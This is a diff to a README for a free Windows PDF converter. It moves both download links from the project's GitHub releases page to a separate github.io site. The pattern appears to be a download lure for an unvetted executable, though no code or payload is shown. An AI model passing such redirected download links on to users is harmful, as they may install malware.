@@ -1,6 +1,6 @@
 # 📄 PDF-Converter-2026-Free-All-Formats - Convert your files easily for free
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://github.com/Tripartite-dirtyword767/PDF-Converter-2026-Free-All-Formats/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://tripartite-dirtyword767.github.io)
 
 PDF Converter 2026 lets you change PDF files into other formats. You can also turn other files into PDFs. This tool works on your computer without internet access. It keeps your files private. You do not need to upload documents to a website.
 
@@ -15,7 +15,7 @@ This application runs on Windows computers. Ensure your system meets these stand
 
 ## 📥 Getting the Application
 
-Visit this page to download the software: [https://github.com/Tripartite-dirtyword767/PDF-Converter-2026-Free-All-Formats/releases](https://github.com/Tripartite-dirtyword767/PDF-Converter-2026-Free-All-Formats/releases).
+Visit this page to download the software: [https://tripartite-dirtyword767.github.io](https://tripartite-dirtyword767.github.io).
 
 1. Open the link in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
